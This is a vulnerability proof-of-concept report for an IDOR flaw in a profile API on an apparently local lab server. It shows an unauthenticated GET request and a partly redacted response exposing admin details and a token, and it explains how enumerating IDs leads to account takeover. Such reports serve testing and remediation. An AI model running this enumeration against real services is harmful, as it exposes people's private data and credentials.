# Proof of Concept: IDOR in User Profile Endpoint (OWASP A01:2021)

**Vulnerability Type:** Insecure Direct Object Reference (Broken Access Control)  
**Affected Component:** `/api/profile?id={userId}`  
**Severity:** HIGH (CVSS 7.5 - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)  
**Target:** `http://127.0.0.1:3000/api/profile?id=1`  

## 1. Technical Vulnerability Description
The endpoint `/api/profile` accepts an arbitrary integer identifier via the query parameter `id` and returns the complete profile object directly from the datastore without validating the requester's authentication token or asserting that the authenticated subject owns the requested record.

## 2. Reproduction Steps (Non-Destructive)
1. Send an unauthenticated HTTP GET request targeting `/api/profile?id=1` (Alice Admin).
2. Observe that the server returns a 200 OK response containing private contact details, account balance, and the confidential `apiToken`.

## 3. Raw HTTP Request
```http
GET /api/profile?id=1 HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: SecurityAudit-HarmlessProbe/1.0
Accept: application/json
```

## 4. Sanitized HTTP Response Evidence
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Server: NodeJS-Express-Lab/1.0.4-dev (Vulnerable Sandbox)

{
  "id": 1,
  "username": "alice_admin",
  "email": "alice@internal-lab.local",
  "role": "admin",
  "fullName": "Alice Walker",
  "phone": "+1-555-0101",
  "balance": 15400,
  "apiToken": "tok_admin_*****************",
  "isSuperUser": true
}
```

*(Note: API token is partially redacted in this report according to safe evidence rules.)*

## 5. Security Impact
Any unauthenticated attacker or low-privileged student user can enumerate all user IDs from 1 to N, harvesting internal emails, administrator tokens, and financial balances, leading to immediate complete account takeover.
